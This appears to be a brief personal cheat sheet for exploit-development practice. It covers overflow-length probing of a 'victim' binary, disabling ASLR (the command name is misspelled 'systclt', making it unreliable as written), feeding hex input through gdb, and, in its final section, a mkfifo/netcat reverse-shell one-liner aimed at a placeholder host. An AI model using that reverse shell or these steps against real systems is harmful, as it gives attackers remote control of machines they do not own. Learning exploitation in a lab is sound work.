# Some tips


## Shell

- Save some shell stuff:
  ```
  $ for i in $(seq 500 530); do echo "trying: ${i}";  ./victim $(printf "%0${i}x"); done
  ```
- for change ownership to test shellcoding:
  ```
   $ sudo chown root victim
   $ sudo chmod +x victim
  ```
- disabling ASLR for educational pourposes:
  ```
  $ sudo systclt -w kernel.randomize_va_space=0
  ```  

## GDB

- To run gdb with printf from bash [1](https://www.reddit.com/r/bash/comments/1cbqif7/send_a_program_receiving_piped_input_into_a/):
  ```
  ~$>gdb program.c
  (gdb) b *main
  (gdb) r < <(printf "some text"; printf "\xsomehex")
  ```
  
## Shellconection

- Shellcode to reverse connect:
  ```
  $mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  5432 > /tmp/f

  ```


